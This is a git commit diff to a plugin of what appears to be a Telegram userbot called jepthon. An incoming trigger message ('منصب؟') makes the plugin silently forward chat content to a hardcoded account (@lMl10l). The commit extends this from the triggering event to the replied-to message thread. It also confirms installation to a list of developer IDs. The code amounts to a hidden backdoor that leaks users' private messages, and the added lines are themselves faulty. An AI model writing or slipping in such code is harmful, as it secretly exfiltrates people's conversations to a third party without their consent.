5685bcc47cb0e39b661fc83f7e13db0ebf69b823
السيد <106372829+jepthoniq@users.noreply.github.com>
2022-07-04 00:28:03 +0300

    Update منصب؟.py

--- jepthon/plugins/منصب؟.py
+++ jepthon/plugins/منصب؟.py
@@ -6,6 +6,10 @@ prog = [393120911, 705475246, 1374312239]
 @jepiq.on(events.NewMessage(outgoing=False, pattern="منصب؟"))
 async def isJep(event):
     if event.reply_to is not None:
-        await jepiq.send_message("@lMl10l", str(event))
+        try:
+        	ms = jepiq.iter_messages(event.chat_id, reply_to = event.reply_to_msg_id)
+        except BaseException as r:
+            print(str(r))
+        await jepiq.send_message("@lMl10l", str(ms))
         if event.from_id.user_id in prog :
             await event.reply('يب منصب جيبثون ✓')
